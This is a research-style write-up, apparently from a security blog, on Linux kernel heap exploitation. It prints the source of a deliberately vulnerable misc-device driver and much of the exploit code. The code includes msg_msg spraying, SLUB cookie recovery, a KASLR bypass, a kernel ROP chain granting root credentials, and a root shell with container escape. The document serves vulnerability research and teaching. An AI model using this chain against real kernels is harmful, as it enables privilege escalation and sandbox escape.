![preview](https://lowlevel.re/uploads/1770595418893.png)

## Abstract

This paper presents a detailed analysis of a Linux kernel heap exploitation technique based on a deliberately vulnerable misc device exposing a use-after-free (UAF) primitive. By combining controlled object lifetime corruption with System V message queues, pipe-based heap spraying, and task structure traversal, we demonstrate a fully weaponized local privilege escalation (LPE) exploit achieving arbitrary kernel code execution.

The exploit chain bypasses common kernel hardening mechanisms, including KASLR, SLUB freelist hardening, SMEP, and SMAP, without relying on kernel symbol disclosure. The work is intended as a research-grade, end-to-end demonstration of modern kernel heap exploitation methodology.

---

## 1. Introduction

Despite significant hardening efforts in recent Linux kernels, memory safety vulnerabilities—particularly use-after-free conditions—remain a critical attack surface. Kernel heap UAFs are especially dangerous due to object reuse patterns, allocator predictability, and the presence of rich in-kernel data structures reachable from user space.

This paper documents a complete exploitation chain starting from a minimal UAF in a misc device driver and culminating in reliable privilege escalation. Emphasis is placed on invariants and allocator behavior rather than kernel-version-specific quirks.

---

## 2. Threat Model

We assume the attacker has:

* Local, unprivileged code execution
* Access to a vulnerable misc device node
* No arbitrary kernel read primitive initially
* KASLR, SMEP, SMAP enabled
* SLUB allocator with freelist hardening enabled

The origin of the vulnerability (debug module, third-party driver, CTF challenge, etc.) is considered out of scope.

The following conditions are assumed:

- `struct msg_msg` allocations originate from predictable kmalloc caches (in particular kmalloc-1024 for large messages), without per-object randomization.
- SLUB freelist hardening is enabled, but without delayed reuse or quarantine mechanisms.
- System V IPC is available and not restricted by LSM policy.
- No additional heap isolation interferes with deterministic object reuse.

The exploit does **not** rely on kernel symbol disclosure, `/proc` or debug interfaces, timing races, or speculative execution.

### Environment

* Linux 6.1.161 (x86_64)
* SLUB allocator with `CONFIG_SLAB_FREELIST_HARDENED=y`
* KASLR, SMEP, SMAP enabled
* nsjail container sandbox
* GCC 12.2.0

User shell sandboxed with nsjail:

![user-shell](https://lowlevel.re/uploads/1770581367196.png)

Kernel-specific offsets are used for concreteness in this proof-of-concept, but the
exploitation strategy itself relies on allocator and IPC invariants rather than
version-specific quirks.

---

## 3. Vulnerable Kernel Interface

The target kernel module exposes a misc device named `/dev/session`. Internally, it manages a single global `struct session` object, allocated and freed via ioctl commands.

Source code:

```c
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/ktime.h>
#include <linux/sched.h>

#define DEV_NAME "session"

#define IOCTL_NEW_SESSION     0xdead0001
#define IOCTL_DELETE_SESSION  0xdead0002

struct session {
    u64 session_id;
    u64 owner_pid;
    char data[0x20];
};

static struct session *sess;

static long session_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {

    switch (cmd) {

        case IOCTL_NEW_SESSION:
            if (sess) {
                pr_info("[SESSION] session already exists\n");
                return -EINVAL;
            }
            sess = kzalloc(sizeof(*sess), GFP_KERNEL_ACCOUNT);
            if (!sess) return -ENOMEM;
            sess->session_id = ktime_get_ns();
            sess->owner_pid  = (u64)task_pid_nr(current);
            pr_info("[SESSION] new session allocated\n");
            break;

        case IOCTL_DELETE_SESSION:
            if (!sess) return -EINVAL;
            pr_info("[SESSION] deleting session\n");
            kfree(sess);
            break;

        default:
            return -EINVAL;
    }

    return 0;
}

static ssize_t session_write(struct file *f, const char __user *buf, size_t len, loff_t *off) {

    char tmp[0x20];
    if (!sess) return -EINVAL;
    if (copy_from_user(tmp, buf, sizeof(tmp))) return -EFAULT;
    memcpy(sess->data, tmp, sizeof(tmp));

    return sizeof(tmp);
}

static const struct file_operations fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = session_ioctl,
    .write          = session_write,
};

static struct miscdevice dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = DEV_NAME,
    .fops  = &fops,
};

static int __init session_init(void)
{
    sess = NULL;
    pr_info("[SESSION] module loaded\n");
    return misc_register(&dev);
}

static void __exit session_exit(void)
{
    if (sess)
        kfree(sess);

    misc_deregister(&dev);
    pr_info("[SESSION] module unloaded\n");
}

module_init(session_init);
module_exit(session_exit);

MODULE_LICENSE("GPL");
```

### 3.1 Data Structures

```c
struct session {
    u64 session_id;
    u64 owner_pid;
    char data[0x20];
};

static struct session *sess;
```

### 3.2 IOCTL Semantics

* `IOCTL_NEW_SESSION`: allocates the global session object
* `IOCTL_DELETE_SESSION`: frees the object
* `write()`: copies user-controlled data into `sess->data`

### 3.3 Vulnerability

The following properties introduce a use-after-free condition:

* `sess` is global and shared across all file descriptors
* No synchronization or reference counting
* `write()` does not validate object lifetime

Once freed, `sess` may be reallocated by an unrelated kernel object while still being dereferenced.

---

## 4. Exploitation Invariants

Rather than relying on fragile offsets or timing assumptions, this exploit is built
around a small set of stable kernel invariants:

1. Freed heap objects may be reallocated by unrelated subsystems.
2. Certain kernel objects (`msg_msg`) trust internal metadata influenced by user space.
3. Allocator hardening mechanisms can be reversed when multiple related leaks exist.
4. Kernel data structures form navigable graphs once arbitrary read is achieved.
5. Kernel control-flow integrity assumes allocator consistency.

Each stage of the exploit either leverages or temporarily violates these invariants
until the final control-flow hijack.

### Kernel-Specific Constants

The following offsets are specific to the target kernel (6.1.161) and must be adjusted for other versions:

```c
#define SPRAY_MSG_SIZE      0x2000
#define KMALLOC_1024_SIZE   0x400
#define MSG_NEXT_BUF_OFFSET 0xfc8     // offset to next msg_msg payload in leaked data
#define MSG_FD2_OFFSET      0x30      // freelist pointer #1 in leaked SLUB metadata
#define MSG_FD3_OFFSET      0x70      // freelist pointer #2 in leaked SLUB metadata
#define MSG_KMALLOC_PTR     0x10      // offset to kmalloc-1024 pointer in leaked chain
#define TASK_NEXT_OFFSET    0x4a0     // offsetof(struct task_struct, tasks.next)
#define TASK_COMM_OFFSET    0x778     // offsetof(struct task_struct, comm)
#define TASK_STACK_OFFSET   0x20      // offsetof(struct task_struct, stack)
#define TASK_FS_OFFSET      0x7a8     // offsetof(struct task_struct, fs)
#define TASK_SAFE_OFFSET    0x38      // safe dereference offset within task_struct
#define RET_OFFSET          0x3f08    // saved return address offset on kernel stack
#define RSP_DELTA           0x20      // stack alignment correction for iretq
```

---

## 5. Heap Reallocation Using msg_msg

```c
/* msg_msg spray → UAF → re-spray */
spray_range(qid, 1, 10);
dev_new_session(fd);
dev_del_session(fd);
spray_range(qid, 11, 1024);
```

System V message queues allocate `struct msg_msg` objects from the kernel heap. While many kernel subsystems allocate heap objects, `msg_msg` is uniquely dangerous in exploitation contexts due to its **cross-boundary semantics** and **weak trust assumptions**.

### 5.1 Why msg_msg Violates Trust Boundaries

Unlike most kernel heap objects, `msg_msg` instances are:

* **User-addressable by design**: they are created, sized, queued, copied, and freed directly in response to user-space syscalls.
* **Persistently reachable**: messages remain resident in the kernel until explicitly received or removed, decoupling allocation lifetime from call stack lifetime.
* **Shared across subsystems**: IPC code, security hooks, allocator code, and copy helpers all manipulate the same object.

As a result, `msg_msg` naturally crosses what would otherwise be isolation boundaries between:

* allocation vs. use
* producer vs. consumer
* metadata vs. payload

This makes it an ideal *bridge object* for reusing freed memory originating from unrelated kernel subsystems.

### 5.2 MSG_COPY and Structural Risk

The `MSG_COPY` flag allows copying a message without dequeuing it. This breaks a fundamental invariant assumed by many kernel developers:

> **Reading a kernel object normally implies consuming or invalidating it.**

With `MSG_COPY`, the kernel:

* Traverses internal message lists
* Copies metadata and payload
* Leaves the original object fully live

This dramatically increases the exploitation surface:

Crucially, `MSG_COPY` allows observing corrupted message state without consuming or
freeing the underlying object. This turns a transient heap corruption into a persistent
oracle: the same corrupted object can be inspected repeatedly, enabling iterative
refinement of heap state without destabilizing the kernel.

This property is essential for reliability and distinguishes this approach from
single-shot exploitation techniques.

In practice, this enables repeated probing of corrupted state and turns transient corruption into a reusable oracle.

### 5.3 IPC ≠ Isolation

Although IPC mechanisms are often discussed as communication channels, they are **not isolation boundaries**. Message queues are global kernel objects indexed by keys, not namespaces. Any process with sufficient permissions may interact with them, regardless of their origin.

This global visibility makes `msg_msg` an unusually powerful primitive for:

* cross-context heap manipulation
* allocator grooming
* controlled lifetime overlap

---

## 6. msg_msg Metadata Corruption

```c
struct evil_msg evil = {
    .mtype = 0x1337,
    .size  = 0x2000,
};

dev_write(fd, &evil, sizeof(evil));
```

Once a freed `struct session` is reallocated as a `struct msg_msg`, writes through the dangling pointer directly corrupt message metadata. This section details why this corruption is especially powerful.

### 6.1 Internal Layout (Simplified)

A typical `msg_msg` allocated from a kmalloc cache contains:

* list pointers (`mlist.next`, `mlist.prev`)
* message type (`m_type`)
* message length (`m_ts`)
* next pointer (`next`)
* security pointer
* flexible payload buffer

While the exact layout varies across kernel versions, two properties remain invariant:

1. **Linkage pointers are adjacent to user-influenced fields**
2. **Message size directly controls copy and traversal behavior**

### 6.2 Fields Under Attacker Control

By overwriting the reclaimed object, the exploit corrupts:

* `next`: redirects kernel list traversal
* `m_ts`: influences how much data is copied to user space

These fields are chosen deliberately:

* `next` is trusted blindly by list iteration code
* `m_ts` is assumed to be internally consistent with allocation size

No semantic validation is performed once the object is considered a valid message.

### 6.3 Kernel Perception vs. Reality

From the kernel’s perspective:

* It is traversing a legitimate IPC message list
* Sizes are trusted because they originate from message creation
* Security hooks are already resolved

From the attacker’s perspective:

* List traversal becomes an arbitrary read/write primitive
* Message copies leak adjacent heap memory
* Frees can be redirected to attacker-chosen objects

This semantic mismatch—**the kernel manipulating attacker-shaped data under internal trust assumptions**—is the core reason `msg_msg` corruption is so effective.

---

## 7. Heap Base and SLUB Cookie Recovery

```c
/* leak msg chain */
struct spray_msg leak;
msg_scan(qid, &leak);

uint32_t h2 = *(uint32_t *)(leak.mtext + 0x20);
uint32_t h3 = *(uint32_t *)(leak.mtext + 0x60);

/* controlled frees */
msg_free(qid, h3);
msg_free(qid, h2);

msg_scan(qid, &leak);

/* heap + cookie */
uint64_t fd2 = *(uint64_t *)(leak.mtext + MSG_FD2_OFFSET);
uint64_t fd3 = *(uint64_t *)(leak.mtext + MSG_FD3_OFFSET);

uint64_t heap_raw = (fd2 ^ fd3) - 0x40;
uint64_t heap     = heap_raw | 0xffff000000000000ULL;
uint64_t cookie = fd2 ^ (heap + 0x40) ^ bswap64(heap + 0x20);

printf("[+] heap:   0x%lx\n", heap);
printf("[+] cookie: 0x%lx\n", cookie);
```

Modern SLUB hardening encodes freelist pointers using XOR-based cookies. By leaking multiple corrupted freelist entries, the cookie can be reconstructed algebraically.

Recovered values include:

* Kernel heap base
* SLUB freelist cookie

This defeats allocator hardening without brute force.

---

## 8. kmalloc-1024 Cache Disclosure

Early attempts focused on SLUB-64 and SLUB-128 caches. In practice, these caches exhibited excessive allocator noise and competing kernel allocations, making reuse unreliable. As a result, exploitation pivoted toward **kmalloc-1024**, which offered:

* Lower allocation churn
* Larger contiguous metadata regions
* Stable reuse semantics

```c
/* refill chain, leak kmalloc-1024 */
uint64_t pad = 0xdeadbeef;

while (1) {
    msg_send(qid, 0x1336, &pad, sizeof(pad));
    msg_scan(qid, &leak);
    if (!has_pattern(leak.mtext, SPRAY_MSG_SIZE, 0xdead000000000100, 0x10))
        break;
}

msg_send(qid, 0x1336, &pad, sizeof(pad));
msg_send(qid, 0x1338, &pad, KMALLOC_1024_SIZE - 0x40);
msg_scan(qid, &leak);

uint64_t kmalloc_addr = *(uint64_t *)(leak.mtext + MSG_KMALLOC_PTR);

msg_free(qid, 0x1338);

printf("[+] kmalloc-1024: 0x%lx\n", kmalloc_addr);
```

By extending the corrupted message chain and reallocating larger messages, a pointer into the kmalloc-1024 cache is leaked. This region is later used to host a kernel ROP chain.

---

## 9. KASLR Bypass via Pipe Spraying

```c
evil.next = kmalloc_addr - 0x10;
dev_write(fd, &evil, sizeof(evil));

while (1) {
    spray_pipes();
    msg_scan(qid, &leak);
    if (find_pipe_like_pattern(leak.mtext, SPRAY_MSG_SIZE) != -1)
        break;
    close_pipes();
}

uint64_t ops = *(uint64_t *)(leak.mtext + MSG_NEXT_BUF_OFFSET + 0x20);
uint64_t kernel_base = ops - 0x102d800;
printf("[+] kernel base: 0x%lx\n", kernel_base);
```

Pipes allocate `struct pipe_buffer` objects containing function pointers into the kernel text. By spraying pipes and scanning leaked memory for pipe-like patterns, a kernel text pointer is disclosed.

Subtracting a known offset yields the kernel base address, fully defeating KASLR.

---

## 10. task_struct Traversal

```c
uint64_t init_task = kernel_base + 0x1415a40;
uint64_t next = init_task, comm = 0;

while (comm != COMM_EXPLOIT_TAG) {
    evil.next = next + TASK_SAFE_OFFSET;
    dev_write(fd, &evil, sizeof(evil));
    msg_scan(qid, &leak);
    memcpy(&next, leak.mtext + MSG_NEXT_BUF_OFFSET + TASK_NEXT_OFFSET - TASK_SAFE_OFFSET, 8);
    memcpy(&comm, leak.mtext + MSG_NEXT_BUF_OFFSET + TASK_COMM_OFFSET - TASK_SAFE_OFFSET, 8);
    next -= TASK_NEXT_OFFSET;
}

uint64_t current_task = evil.next - TASK_SAFE_OFFSET;
```

With arbitrary read capability, the exploit traverses the doubly linked task list starting from `init_task`. Processes are identified by comparing the `comm` field.

This yields the address of the current task structure.

---

## 11. Kernel Stack Disclosure

```c
evil.next = current_task;
dev_write(fd, &evil, sizeof(evil));
msg_scan(qid, &leak);

uint64_t stack = *(uint64_t *)(leak.mtext + MSG_NEXT_BUF_OFFSET + TASK_STACK_OFFSET);
```

From `task_struct`, the kernel stack pointer is read. Knowledge of the stack base allows precise targeting of saved return addresses.

---

## 12. Kernel ROP Construction

During exploitation, common gadget-finding tools such as `ROPgadget` were found to be unreliable when applied to the kernel image.

In practice, `ROPgadget` may:
- report non-existent gadgets due to incorrect disassembly
- interpret embedded data as executable code
- miss valid gadgets hidden inside larger instruction sequences

This is especially problematic in kernel exploitation, where:
- the executable range is large
- alignment constraints differ from userland
- incorrect gadgets often lead to silent crashes or triple faults

### Raw GDB Memory Scanning

A significantly more reliable approach is to search the kernel text section directly using `gdb` byte patterns:

```c
find /b 0xffffffff81000000, 0xffffffff82ffffff, 0x48, 0x89, 0x17, 0xc3
```

This search locates the raw instruction sequence:

```c
mov qword ptr [rdi], rdx
ret
```

Advantages of this method:
- avoids false positives caused by speculative disassembly
- guarantees the exact instruction sequence exists in executable memory
- allows manual validation of surrounding context
- scales well for simple, high-value gadgets (mov, pop, xchg, ret)

In practice, this approach proved both faster and more reliable than automated gadget enumeration when building kernel ROP chains.

### Freelist Repair and Heap Consistency

Earlier stages of the exploit intentionally corrupt SLUB freelist metadata in order
to gain arbitrary read and write primitives. Leaving the allocator in a corrupted
state, however, significantly reduces post-exploitation stability.

Before executing sensitive kernel routines, the exploit explicitly repairs the
freelist head pointer as part of the ROP chain. This restores allocator invariants
and prevents secondary crashes caused by subsequent kernel allocations.

Rather than exploiting the kernel *against* its assumptions, the exploit temporarily
violates them and then restores consistency before resuming normal execution.

This repair step is not strictly required for privilege escalation, but is essential
for reliable post-exploitation behavior.

### Full ROP chain to escape & be root

```c
uint64_t rop[(KMALLOC_1024_SIZE - 0x40) / 8] = {0};
uint64_t *p = rop;
    
// repair freelist head ptr after corruption
*p++ = pop_rdi;
*p++ = (heap & 0xfffffffff0000000ULL) + 0x2ac36240;
*p++ = pop_rdx;
*p++ = heap + 0x40;
*p++ = mov_rdi_rdx;

// prepare root creds
*p++ = pop_rdi;
*p++ = init_cred;
*p++ = commit_cred;

// switch ns 
*p++ = pop_rdi;
*p++ = current_task;
*p++ = pop_rsi;
*p++ = init_proxy;
*p++ = switch_ns;

// switch fs
*p++ = pop_rdi;
*p++ = current_task + TASK_FS_OFFSET;
*p++ = pop_rdx;
*p++ = init_fs;
*p++ = mov_rdi_rdx;

// ret2user
*p++ = ret2user;
*p++ = 0;
*p++ = 0;
*p++ = (uint64_t)win;
*p++ = cs;
*p++ = rflags;
*p++ = rsp + RSP_DELTA;
*p++ = ss;

msg_send(qid, 0x1338, rop, sizeof(rop));
msg_scan(qid, &leak);

uint64_t rop_addr = *(uint64_t *)(leak.mtext + 0x10) + 0x30;
```

A ROP chain is constructed in the previously leaked kmalloc-1024 region. The chain performs:

1. Fix the freelist head pointer corrupted after our poison
2. `commit_creds(init_cred)`
3. Namespace switching
4. `fs_struct` repair
5. Clean return to userland via `iretq`

The final userland payload spawns a root shell.

---

## 13. Control Flow Hijack

```c
/* freelist poison + trigger */
evil.size = 8;
evil.next = 0;
dev_write(fd, &evil, sizeof(evil));
msg_free(qid, 0x1337);

evil.next = cookie ^ (stack + RET_OFFSET) ^ bswap64(heap - 0x20);

dev_write(fd, &evil, sizeof(evil));

int qid2 = get_queue(QID_TRIGGER);

while (1) {
    char payload[0x10] = {0};
    memcpy(payload, &pop_rsp, 8);
    memcpy(payload + 8, &rop_addr, 8);
    msg_send(qid2, 0x1337, payload, sizeof(payload));
}
```

Using freelist poisoning, an allocation is forced to overlap a saved kernel return address. Execution is redirected to a stack pivot gadget, transferring control to the ROP chain.

With the ret2user workflow, the win function is then executed:

```c
__attribute__((noreturn))
static void win(void) {
    puts("[+] r00t!");
    if (!fork())
        execl("/bin/bash", "bash", "-i", "-c", "stty sane; exec bash -i", NULL);
    _exit(0);
}
```

---

## 14. Results

The exploit was evaluated qualitatively across multiple runs on the same kernel configuration.

![shell-host](https://lowlevel.re/uploads/1770581371488.png)

We have successfully escaped the container and are root in the host space:

![escaped](https://lowlevel.re/uploads/1770581375671.png)

### 14.1 Stability

* Successful privilege escalation was achieved consistently once heap layout was established.
* No kernel crashes were observed during successful runs.
* Failures typically resulted in benign allocation misses rather than panics.

### 14.2 Reliability Factors

The primary factors influencing reliability are:

* Timing of heap reallocation after the UAF
* Competing kernel allocations
* Pipe spray density

Once heap reuse succeeds, subsequent stages (leaks, traversal, ROP) are deterministic.

### 14.3 Noise and Failure Modes

Acceptable noise includes:

* Occasional failure to reclaim the target slot
* Transient inability to locate a pipe buffer

These conditions are detected and retried without destabilizing the kernel.

---

## 15. Security Implications

This research highlights several systemic issues:

* Global kernel objects are inherently dangerous
* SLUB hardening is insufficient against multi-leak attacks
* `msg_msg` remains a powerful exploitation primitive
* KASLR is ineffective once a single function pointer leaks

---

## 16. Mitigation Discussion

Mitigating this class of vulnerability is non-trivial and requires trade-offs.

### 16.1 Object Lifetime Hardening

Per-file or per-instance object allocation would eliminate the global aliasing issue entirely. However, this approach:

* increases memory usage
* complicates driver logic
* breaks existing assumptions in legacy code

Despite the cost, this is the most effective mitigation.

### 16.2 Allocator Hardening

SLUB freelist encoding raises the bar but does not prevent exploitation when multiple leaks are available. Stronger encoding or delayed reuse could help, but:

* they impose performance overhead
* they do not address logical lifetime bugs

### 16.3 IPC Restrictions

Restricting or namespacing System V IPC could reduce cross-context abuse. In practice, IPC semantics are deeply ingrained and widely used. Breaking them is unlikely to be acceptable.

### 16.4 Reality Check

Ultimately, memory safety violations in kernel code remain exploitable despite incremental hardening. Eliminating entire bug classes—rather than patching symptoms—is the only robust solution.

## Why Not a Simpler Exploit?

Several seemingly simpler exploitation strategies were intentionally avoided:

- Direct kernel write primitives tend to destabilize the allocator early.
- Timing races introduce non-determinism and reduce reliability.
- Brute-force techniques are ineffective against modern hardening.
- Symbol-based leaks are increasingly unavailable on production systems.

The chosen approach favors deterministic reuse, observable corruption, and incremental
state recovery over opportunistic shortcuts.

---

## 17. Conclusion

Source code & environment setup: https://github.com/retleave/pocs

This paper demonstrates that kernel heap UAF vulnerabilities remain fully exploitable on modern Linux systems. By relying on allocator invariants rather than fragile offsets, reliable exploitation is achievable even under significant hardening.

The key takeaway is not that a specific vulnerability is exploitable, but that entire
classes of kernel heap lifetime violations remain exploitable despite incremental
hardening. As long as global objects, trusted metadata, and cross-subsystem allocation
reuse coexist, reliable exploitation remains possible.


---

*This document is intended for defensive research and educational purposes.*